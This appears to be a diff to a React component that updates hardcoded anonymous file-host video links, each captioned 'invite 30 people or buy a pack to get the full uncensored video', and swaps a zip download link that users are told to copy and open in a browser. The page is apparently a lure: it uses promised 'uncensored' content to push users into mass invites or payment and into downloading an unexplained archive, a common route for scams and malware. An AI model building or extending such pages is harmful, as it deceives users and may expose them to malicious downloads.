@@ -6,23 +6,27 @@ export default function Video({ invites, watermark }) {
     // Hardcoded video URLs and captions
     const videos = [
         {
-            url: 'https://files.catbox.moe/h8utj1.mp4',
+            url: 'https://files.catbox.moe/buegkb.mp4',
             caption: 'invite 30 people or buy a pack get the full uncensored video'
         },
         {
-            url: 'https://files.catbox.moe/03ebky.mp4',
+            url: 'https://files.catbox.moe/hltwc0.mp4',
+            caption: 'invite 30 people or buy a pack get the full uncensored video'
+        },
+        {
+            url: 'https://files.catbox.moe/5nvv5a.mp4',
             caption: 'invite 30 people or buy a pack to get the full uncensored video'
         },
         {
-            url: 'https://files.catbox.moe/ollp4l.mp4',
+            url: 'https://files.catbox.moe/l4pai4.mp4',
             caption: 'invite 30 people or buy a pack to get the full uncensored video'
         },
         {
-            url: 'https://files.catbox.moe/vzuv7j.mp4',
+            url: 'https://files.catbox.moe/cwi0gd.mp4',
             caption: 'invite 30 people or buy a pack to get the full uncensored video'
         },
         {
-            url: 'https://files.catbox.moe/4hluja.mp4',
+            url: 'https://files.catbox.moe/wh2qd6.mp4',
             caption: 'invite 30 people or buy a pack to get the full uncensored video'
         },
         {
@@ -36,7 +40,7 @@ export default function Video({ invites, watermark }) {
     const [copied, setCopied] = useState(false);
 
     const handleCopy = () => {
-        const textToCopy = 'https://files.catbox.moe/4jj2ns.zip';
+        const textToCopy = 'https://files.catbox.moe/6g0wz5.zip';
         navigator.clipboard.writeText(textToCopy).then(() => {
             setCopied(true);
             setTimeout(() => setCopied(false), 2000);
@@ -66,8 +70,8 @@ export default function Video({ invites, watermark }) {
                                 <div className="mb-8 p-4 bg-yellow-100 rounded-md flex items-center justify-between">
                                     <div>
                                         <p className="text-gray-700">Copy this link and open it with a web browser:</p>
-                                        <a href='https://files.catbox.moe/4jj2ns.zip' className="text-blue-500">
-                                            https://files.catbox.moe/4jj2ns.zip
+                                        <a href='https://files.catbox.moe/6g0wz5.zip' className="text-blue-500">
+                                            https://files.catbox.moe/6g0wz5.zip
                                         </a>
                                     </div>
                                     <button
